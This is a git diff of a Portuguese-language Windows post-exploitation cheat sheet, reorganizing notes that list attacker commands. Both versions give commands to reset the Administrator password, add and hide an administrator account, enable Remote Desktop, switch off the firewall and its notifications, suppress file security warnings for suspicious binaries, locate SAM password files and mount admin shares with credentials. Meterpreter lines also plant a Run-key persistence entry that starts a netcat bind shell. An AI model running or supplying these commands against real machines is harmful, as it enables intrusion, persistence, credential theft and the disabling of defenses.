@@ -1,121 +1,118 @@
-TROCAR SENHA DO ADM
-
-net user Administrador 123 (troca senha do Adm)
-
-ATIVAR RDESKTOP
-reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t Reg_DWord /d 0
-
-ADICIONAR USUÁRIOS
-net user curso curso /add
-net localgroup Administradores curso /add
 ----------------------------------------------
-Ocultar o usuário adicionado na tela login
+		COMANDOS BASICOS WINDOWS
 ----------------------------------------------
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v [nome do usuario] /t Reg_DWord /d 0
+-Mostrar conteudo uma pagina | more
+	more [file]
+
+- Procurar string em um arquivo
+	type [file] | find /i "[string]"
+	type [file] | findstr [regex]
+
+- Veriricar variaveis do sistema
+	set
+	set [variable_name]
+
+- Procurar arquivo no sistema
+	dir /b /s [diretorio]\[file]
+	dir /b /s %systemroot%\[file]
+
+----------------------------------------------
+		MANUSEAR USUARIOS
+----------------------------------------------
+
+- net user - listar  usuarios
+- net localgroup - listar grupos
+- net localgroup administrators - listar administradores
+- net user [logon_name] [password] /add - adicionar usuario
+- net localgroup administrators [logon_name] /add - adicionar usuario ao grupo admin
+- net user Administrator 123456 - trocar senha do usuario administrador
+- net user [logon_name] /del - deletar usuario
+
+----------------------------------------------
+		MANIPULANDO O FIREWALL
+----------------------------------------------
+
+- Verificar status do firewall
+	netsh advfirewall show allprofiles
+
+- Autorizar porta regra especifica
+	netsh advfirewall firewall add rule name="[rule_name]" dir=in action=allow remoteip=[yourIpAddress] protocol=TCP localport=[port]
+
+- Deletar regra
+	netsh advfirewall firewall del rule name="[rule_name"
+
+- Desabilitar o Firewall do Windows
+	netsh advfirewall set allprofiles state off
+
+- Habilitar programa no firewall
+	netsh firewall set allowedprogram program = c:\windows\system32\win32b.exe name = win32b mode = ENABLE scope = ALL
+	netsh firewall set allowedprogram program = c:\windows\system32\win32b1.exe name = win32b1 mode = ENABLE scope = ALL
+	netsh firewall set allowedprogram program = c:\windows\system32\win32r.exe name = win32r mode = ENABLE scope = ALL
+
+----------------------------------------------
+		MANIPULANDO CHAVES DE REGISTRO
+----------------------------------------------
+
+- Alterar uma chave de registro
+	reg add [KeyName] /v [ValueName] /t [type] /d [data]
+
+- Exportar configuracoes para chave de registro
+	reg export [KeyNote] [filename.reg]
+
+- Importar configuracoes de chave de registro
+	reg import [filename.reg]
+
+- Ativar o Rdesktop
+	reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t Reg_DWord /d 0
+
+- Ocultar usuario adicionado na tela de login
+	reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v [nome do usuario] /t Reg_DWord /d 0
+
+- Desabilitar alerta de seguranca
+	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v HighRiskFileTypes /t Reg_SZ /d
+	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v LowRiskFileTypes /t Reg_SZ /d "win32b.exe;win32b1.exe;$
+
+- Habilitar servico de compartilhamento de arquivo
+	reg add  "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"  /v forceguest /t REG_DWORD /d 0
+
+- Desativar notificacao de firewal desativado
+	reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center" /v FirewallDisableNotify /t Reg_DWord /d 1
+
+- Desativar firewall - windows xp
+
+	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v EnableFirewall /t Reg_DWord $
+
+	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v DoNotAllowExceptions /t Reg_$
 
 
---------------------------------------------
-Desabilitando Alerta de Segurança
---------------------------------------------
-
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v HighRiskFileTypes /t Reg_SZ /d
-
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v LowRiskFileTypes /t Reg_SZ /d "win32b.exe;win32b1.exe;$
-
-
-
-
---------------------------------------------------------
-Habilitando Serviço de Compartilhamento de Arquivo
---------------------------------------------------------
-reg add  "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa"  /v forceguest /t REG_DWORD /d 0
-
-
-
-
--------------------------------
-Arquivo de senhas do Windows XP
--------------------------------
+-----------------------------------------------
+		Arquivo de senhas do Windows XP
+-----------------------------------------------
 c:\windows\system32\config\sam
 
 c:\windows\repair\sam
 
----------------------------------------------------------
-Desativando Notificação FIREWALL Desativado  - Windows XP
----------------------------------------------------------
+-----------------------------------------------
+		Mudar registro para executar comando
+		sempre que iniciar a maquina
+-----------------------------------------------
 
-reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Security Center" /v FirewallDisableNotify /t Reg_DWord /d 1
+- Lista as entradas do registro
 
----------------------------------
-Desativando FIREWALL - Windows XP
----------------------------------
+	meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
 
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v EnableFirewall /t Reg_DWord $
+- Adiciona nova entrada do registro
 
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v DoNotAllowExceptions /t Reg_$
-
-
---------------------------------------
-Desativando FIREWALL - Windows Vista/7
---------------------------------------
-netsh advfirewall set allprofiles state off
+	meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
+	meterpreter > reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc
 
 
------------------------------------
-Habilitando um programa no FIREWALL
------------------------------------
-netsh firewall set allowedprogram program = c:\windows\system32\win32b.exe name = win32b mode = ENABLE scope = ALL
-netsh firewall set allowedprogram program = c:\windows\system32\win32b1.exe name = win32b1 mode = ENABLE scope = ALL
-netsh firewall set allowedprogram program = c:\windows\system32\win32r.exe name = win32r mode = ENABLE scope = ALL
+-----------------------------------------------
+		CONEXOES SAMBA
+-----------------------------------------------
 
+- Montar uma particao compartilhada
+	net use * \\[targetIP]\[share_dict] /u:[user]
+	net use * \\10.10.10.20\C$ password /u:susan
 
-
-
-=== mudar o registro para rodar toda vez que reinicia o computador
-==lista as entradas do registro
-
-meterpreter > reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
-
-==adiciona nova entrada do registro
-
-meterpreter > reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
-
-reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
-
-== alterar as configurações do firewall local
-
-meterpreter > execute -f cmd -i
-Process 1604 created.
-Channel 1 created.
-Microsoft Windows XP [Version 5.1.2600]
-(C) Copyright 1985-2001 Microsoft Corp.
-
-----
-
-
-C:\Documents and Settings\Jim\My Documents > netsh firewall show opmode
-Netsh firewall show opmode
-
-Domain profile configuration:
--------------------------------------------------------------------
-Operational mode                  = Enable
-Exception mode                    = Enable
-
-Standard profile configuration (current):
--------------------------------------------------------------------
-Operational mode                  = Enable
-Exception mode                    = Enable
-
-Local Area Connection firewall configuration:
--------------------------------------------------------------------
-Operational mode                  = Enable
-
-
-> netsh firewall add portopening TCP 455 "Service Firewall" ENABLE ALL
-
-
-== ou desabilitar
-
-
-C:\WINDOWS\system32>netsh firewall set opmode disable
